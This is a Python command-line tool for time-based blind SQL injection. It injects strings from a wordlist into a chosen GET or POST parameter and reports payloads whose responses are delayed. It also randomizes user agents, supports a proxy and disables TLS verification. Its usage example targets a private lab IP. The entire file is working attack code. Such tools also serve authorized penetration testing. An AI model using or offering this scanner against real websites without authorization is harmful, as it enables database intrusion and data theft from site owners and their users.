#!/usr/bin/python3
import requests
import urllib3
import os
import sys
import re
import inquirer
from tqdm import tqdm
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 10

# Default string as clean value for parameter
def_str = "1234"

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom HTTP headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
    }
    return headers

# Perform the SQLi call for injection
def sqli(url,headers,get_post,inj_param,params,sleep_time,prefix,inj_str,suffix):
    inj_params = dict()
    for param in params:
        inj_params[param] = def_str
        if param == inj_param:
            inj_params[param] = prefix + inj_str + suffix

    # Do GET or POST with a injected string
    if get_post.lower() == "get":
        r = requests.get(url,params=inj_params,headers=headers,timeout=timeout,verify=False)
    elif get_post.lower() == "post":
        r = requests.post(url,data=inj_params,headers=headers,timeout=timeout,verify=False)

    # Time taken of the injected request
    inj_time_resp = r.elapsed.total_seconds()

    # Return the time taken if longer than indicated sleep time
    if inj_time_resp >= int(sleep_time):
        return inj_time_resp
    else:
        return False

# Main
def main(argv):
    if len(sys.argv) == 8:
        params = sys.argv[1].split(",")
        get_post = sys.argv[2]
        sleep_time = int(sys.argv[3])
        prefix = sys.argv[4]
        suffix = sys.argv[5]
        injlist_read = sys.argv[6]
        url = sys.argv[7]
    else:
        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <sleep_time> <prefix> <suffix> <file_injection_strings> <url>")
        print("[*] Example: " + sys.argv[0] + " id get 2 \"1' \" \";-- \" /usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt http://192.168.252.6/cat.php\n")
        exit(-1)

    # Random headers
    headers = http_headers()

    # Read if file exists
    if not os.path.isfile(injlist_read):
        print("[!] Wordlist for injections does not exist. Exiting...")
        exit(-1)

    # Do stuff
    try:
        param_question = [inquirer.List('params',
                message="Select a parameter to test for injection:",
                choices=params),]
        param_answer = inquirer.prompt(param_question)
        inj_param = param_answer["params"]

        # Read lines of file and count them
        inj_lines = open(injlist_read)
        len_inj_lines = len(open(injlist_read).readlines())

        # Print line
        print("[*] Testing parameter \"" + inj_param + "\" for delays of " + str(sleep_time) + " seconds or longer")

        # Loop the strings in attempting to detect possible SQLi
        for inj_str in tqdm(inj_lines,total=len_inj_lines):
            inj_str = inj_str.strip('\n')
            inj_time = sqli(url,headers,get_post,inj_param,params,sleep_time,prefix,inj_str,suffix)
            if inj_time:
                print("\n[*] Param \"" + inj_param + "\" using string \"" + prefix + inj_str + suffix + "\"")
                print("[*] Time taken: " + str(inj_time))

    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()
        exit(-1)

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
